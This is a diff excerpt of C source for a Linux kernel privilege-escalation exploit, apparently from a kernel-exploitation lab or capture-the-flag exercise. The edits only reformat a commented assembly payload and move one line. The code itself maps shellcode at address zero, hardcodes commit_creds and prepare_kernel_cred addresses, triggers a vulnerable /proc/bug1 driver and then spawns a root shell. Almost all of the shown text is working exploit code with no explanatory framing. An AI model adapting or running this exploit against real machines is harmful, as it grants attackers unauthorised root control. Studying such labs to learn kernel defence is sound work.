@@ -28,11 +28,11 @@ unsigned long user_cs, user_ss, user_rflags;
 
 int main(int argc, const char *argv[])
 {
-    /*
+    /*  payload:
      *  mov rbx, 0xffffffff810a1420 // commit_creds
-		mov rax, 0xffffffff810a1810 // kernel_prepare_cred
-		xor rdi, rdi
-		call rax
+        mov rax, 0xffffffff810a1810 // kernel_prepare_cred
+        xor rdi, rdi
+        call rax
         mov rdi, rax
         call rbx
      */
@@ -41,8 +41,8 @@ int main(int argc, const char *argv[])
     memcpy(0, payload, sizeof(payload));
     commit_creds = 0xffffffff810a1420;
     prepare_kernel_cred = 0xffffffff810a1810;
-    int fd = open("/proc/bug1", O_WRONLY);
 
+    int fd = open("/proc/bug1", O_WRONLY);
     write(fd, "muhe", 4);
     //commit_creds(prepare_kernel_cred(0)); <-- this will fail, we can only call this in kernel space
     system("/bin/sh");
